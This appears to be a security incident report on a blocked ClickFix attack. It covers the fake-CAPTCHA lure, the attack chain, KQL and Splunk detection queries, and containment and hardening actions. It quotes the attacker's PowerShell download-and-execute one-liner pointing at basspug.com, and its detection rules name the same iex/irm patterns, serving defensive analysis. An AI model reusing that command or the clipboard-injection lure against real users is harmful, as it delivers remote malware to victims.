Attack Chain

Full sequence from the lure page to the blocked execution

1
User lands on the lure site
Initial vector
myhealthbuddy.co
User browsed to a personal-trainer themed site. Zscaler logged the traffic as ordinary General Browsing — the page itself loads real ad-tech and analytics scripts (Facebook, DoubleClick, Google Ads, Microsoft Clarity), so nothing about the request pattern looked abnormal to the proxy.
2
Fake "verify you're human" overlay
Social engineering
The page presented a bogus CAPTCHA/verification box. Instead of a checkbox, clicking "Verify" silently copied an attacker-controlled command to the clipboard and displayed instructions: press Win+R, then Ctrl+V, then Enter. There is no file to download and no attachment to scan — the entire delivery mechanism is the user's own keystrokes.
3
User pastes and runs the command
RunMRU execution
The Run dialog (RunMRU) executed the pasted line, spawning powershell.exe as a child of explorer.exe — a parent/child pairing that is itself a strong ClickFix indicator, since legitimate PowerShell use is almost never launched directly from the Run box by a non-technical user.
4
Network connection to stager succeeds
Zscaler allowed
GET http://basspug.com/ → 185.141.216.233:80 — ConnectionSuccess
The command's Invoke-RestMethod call reached basspug.com and the connection succeeded at the network layer. The domain carried no malicious category at the time, so Zscaler had no policy reason to stop it.
5
Defender blocks the command line
Prevented — remediation: remove
Trojan:Win32/ClickFix.Q!ml — Blocked
Microsoft Defender for Endpoint's antivirus engine recognized the iex(irm ...) command-line pattern itself and prevented the PowerShell process from executing, 9:23:36 AM — roughly 13 minutes after the first explorer.exe session activity. Whatever basspug.com would have served next was never retrieved or run on the host.

Social Engineering & Evasion

Why ClickFix bypasses the controls a normal phishing email would hit

No file, no attachment, no macro
T1204.004
The payload is a human, not a binary.

Every classic control in the chain — mail attachment scanning, macro blocking, download-reputation checks — assumes the attacker delivers a file. ClickFix delivers instructions instead, and the victim becomes the delivery mechanism by copying and executing the command themselves. There is nothing for an attachment scanner to inspect until the command has already run.
Clipboard injection hides the payload from the user
T1027
The user never sees the command they are about to run.

JavaScript on the page writes the real PowerShell one-liner to the clipboard the moment "Verify" is clicked. The on-screen instructions only say "press Ctrl+V and Enter" — they never show the pasted content. A user who did try to read the Run box before pressing Enter would still likely not recognize iex(irm basspug.com) as dangerous.
Fileless, domain-fronted second stage
T1105 / T1583.001
The one-liner is intentionally short-lived and content-free.

iex(irm basspug.com -UseBasicParsing) downloads and executes whatever basspug.com returns, entirely in memory — no file touches disk until (or unless) the retrieved script decides to drop one. The actual malware logic lives server-side and can be swapped at any time, while the client-side IOC stays a short, forgettable string. Freshly registered stager domains like this typically have no reputation yet, so domain-category blocking can't catch them on day one — detection has to fall back to the command-line pattern itself, which is exactly what stopped this incident.

Why the network layer still let the stager connection through after Defender blocked the command

Time Action URL / Destination Category Explanation
09:23:xx AM allowed myhealthbuddy.co/ General Browsing Lure page itself carries no malicious category — looks like an ordinary small-business site.
09:23:36 AM blocked (client-side) powershell.exe → basspug.com — Defender's antivirus engine blocked the command line before irm could be issued from the process — this is an endpoint control, not a proxy decision.
— allowed basspug.com → 185.141.216.233:80 Miscellaneous / Unknown DeviceNetworkEvents / Zscaler both show ConnectionSuccess to basspug.com. The domain had no malicious category at lookup time (GTI: SEVERITY_NONE), so the web gateway had no policy reason to deny it.
Key finding: endpoint block ≠ network block
Detection layering gap
The incident closed cleanly because Microsoft Defender's AV engine caught the command-line signature before the retrieved script could execute. But the Zscaler and DeviceNetworkEvents logs confirm the outbound connection to basspug.com still succeeded — the web gateway had nothing to key off yet. If the endpoint control had failed or the domain had served its payload fast enough, the network layer alone would not have stopped it.

Remediation: basspug.com and myhealthbuddy.co were both added to Zscaler's blocklist as part of closure — but proactively, "newly observed domain contacted directly by irm/iwr from PowerShell" is itself a pattern worth a standing correlation rule, independent of category reputation.

Detection Queries

KQL queries used during triage, and a generalized ClickFix detection rule built off this incident

Hunt for the stager domain across the estate

DeviceNetworkEvents | where RemoteUrl has "basspug.com" | project Timestamp, DeviceName, RemoteIP, RemoteUrl, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine | order by Timestamp desc // Result: 1 device, 1 user — no lateral spread confirmed

Generalized ClickFix pattern — iex(irm <domain>) from the Run dialog

// Flags short PowerShell one-liners that download-and-execute via irm/iwr, // spawned directly from explorer.exe (Win+R) rather than a script host DeviceProcessEvents | where FileName in~ ("powershell.exe", "pwsh.exe", "mshta.exe") | where InitiatingProcessFileName =~ "explorer.exe" | where ProcessCommandLine matches regex @"(?i)iex\s*\(\s*(irm|iwr|new-object\s+net\.webclient)" | project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName | order by Timestamp desc

RunMRU registry write immediately followed by script-host execution

// RunMRU key write = user typed/pasted something into Win+R; // correlate against a script host launching within the same minute DeviceRegistryEvents | where RegistryKey has @"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" | join kind=inner ( DeviceProcessEvents | where FileName in~ ("powershell.exe", "cmd.exe", "mshta.exe") ) on DeviceId | where ProcessCreationTime between (Timestamp .. Timestamp + 1m) | project Timestamp, DeviceName, AccountName, ProcessCommandLine

Block vs. beacon correlation (Splunk SPL)

// Catches the exact gap seen in this incident: AV blocked the process, // but the proxy still logged a successful connection to the same domain index=atpdef sourcetype="ms365:defender:incident:alerts" AlertTitle="*ClickFix*" | rename deviceDnsName AS devicehostname | join devicehostname [ search index=zscaler | table _time, devicehostname, action, url, serverip ] | table _time, devicehostname, AlertTitle, action, url, serverip

Verdict & Actions

Response actions actually taken, and longer-term hardening recommendations

Verdict
BLOCKED — TRUE POSITIVE
Action taken
Isolate + Reimage + Reset

Immediate containment (actioned)

  • Device DEMO-CORP-WKS-0042 isolated and recommended for reimage, even though automated investigation found no residual threat — standard precaution after an active ClickFix detection
  • Password reset forced for the affected user via Entra ID
  • Both myhealthbuddy.co and basspug.com blocked in Zscaler
  • User referred to security-awareness training specifically covering ClickFix-style fake verification pages
  • Scope confirmed via DeviceNetworkEvents: one device, one user — no lateral spread
  • Investigation and closure logged under DEMO-INC0001234 — "Malicious PowerShell Execution - DEMO-CORP-WKS-0042"

Policy hardening

  • Don't wait on category reputation for freshly-registered domains contacted directly by irm/iwr from PowerShell — alert on the pattern itself regardless of domain age
  • Evaluate an Attack Surface Reduction rule blocking script-host children (powershell.exe, mshta.exe, cmd.exe) spawned directly from explorer.exe within seconds of a RunMRU registry write
  • Expand phishing-simulation / awareness content to specifically include ClickFix pretexts (fake CAPTCHA, fake driver/update prompts, fake meeting-fix instructions) — these bypass the "don't open attachments" training most users already have

Detection improvements

  • Generalized KQL rule (above) for iex(irm <domain>) / iex(New-Object Net.WebClient) one-liners launched from explorer.exe — deployed as a standing detection, not a one-off hunt
  • Splunk correlation: Defender "prevented execution" event + a Zscaler/DeviceNetworkEvents connection success to the same remote URL within a short window → auto-escalate, since a client-side block does not guarantee the network layer also stopped the beacon
  • RunMRU-to-script-host correlation rule (above) as a lower-fidelity, higher-coverage companion to the command-line regex — catches obfuscated or renamed stager variants that don't match the exact string pattern
